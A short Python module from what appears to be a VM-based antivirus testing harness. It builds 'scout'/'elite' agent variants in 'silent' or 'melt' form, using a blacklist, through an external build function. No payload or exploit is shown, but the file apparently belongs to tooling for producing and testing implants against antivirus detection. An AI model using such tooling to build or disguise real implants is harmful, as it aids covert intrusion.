__author__ = 'fabrizio'


import logging
import time

from AVCommon import command
from AVAgent import build

def on_init(vm, args):
    """ server side """
    pass

def on_answer(vm, success, answer):
    """ server side """
    pass


def execute(vm, args):
    """ client side, returns (bool,*) """
    logging.debug("    BUILD %s" % args)
    assert vm, "null vm"
    assert command.context, "Null context"

    backend = command.context["backend"]
    frontend = command.context["frontend"]
    params = command.context["build_parameters"]
    blacklist = command.context["blacklist"]

    logging.debug("args: %s", args)
    action, platform, kind = args

    param = params[platform]
    platform_type = param['platform_type']

    assert kind in ['silent', 'melt'], "kind: %s" % kind
    assert action in ['scout', 'elite', 'internet', 'test', 'clean', 'pull'], "action: %s" % action
    assert platform_type in ['desktop', 'mobile'], "platform_type: %s" % platform_type

    ret = build.build(action, platform, platform_type, kind, param, backend, frontend, blacklist)

    time.sleep(10)
    logging.debug("stop sleeping")
    return True, ret